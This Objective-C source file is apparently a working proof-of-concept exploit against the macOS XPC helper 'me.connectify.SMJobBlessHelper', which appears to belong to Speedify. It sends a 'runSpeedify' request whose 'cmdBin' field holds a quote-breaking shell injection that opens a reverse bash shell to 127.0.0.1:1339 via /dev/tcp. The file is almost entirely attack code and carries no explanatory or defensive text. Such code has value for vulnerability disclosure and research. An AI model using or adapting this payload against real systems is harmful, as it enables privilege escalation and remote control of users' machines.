#import <Foundation/Foundation.h>
#import <xpc/xpc.h>
#include <unistd.h>
#include <stdlib.h>

void sendExploitMessage(const char *serviceName) {
    NSLog(@"[DEBUG] Connecting to XPC service: %s", serviceName);

    xpc_connection_t connection = xpc_connection_create_mach_service(serviceName, NULL, 0);
    if (!connection) {
        NSLog(@"[ERROR] Failed to create XPC connection.");
        return;
    }

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        if (type == XPC_TYPE_DICTIONARY) {
            const char *reply = xpc_dictionary_get_string(event, "reply");
            if (reply) {
                NSLog(@"[DEBUG] Received reply from service: %s", reply);
            }
        } else if (type == XPC_TYPE_ERROR) {
            NSLog(@"[ERROR] XPC service error.");
        }
    });

    xpc_connection_resume(connection);
    NSLog(@"[DEBUG] Connection to XPC service started.");

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "request", "runSpeedify");

    xpc_dictionary_set_string(message, "cmdPath", "/tmp");
    const char *injectionPayload = "\"; bash -i >& /dev/tcp/127.0.0.1/1339 0>&1; echo \"";
    xpc_dictionary_set_string(message, "cmdBin", injectionPayload);

    xpc_connection_send_message(connection, message);

    xpc_release(message);
    xpc_release(connection);
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        const char *serviceName = "me.connectify.SMJobBlessHelper";
        sendExploitMessage(serviceName);
    }
    return 0;
}
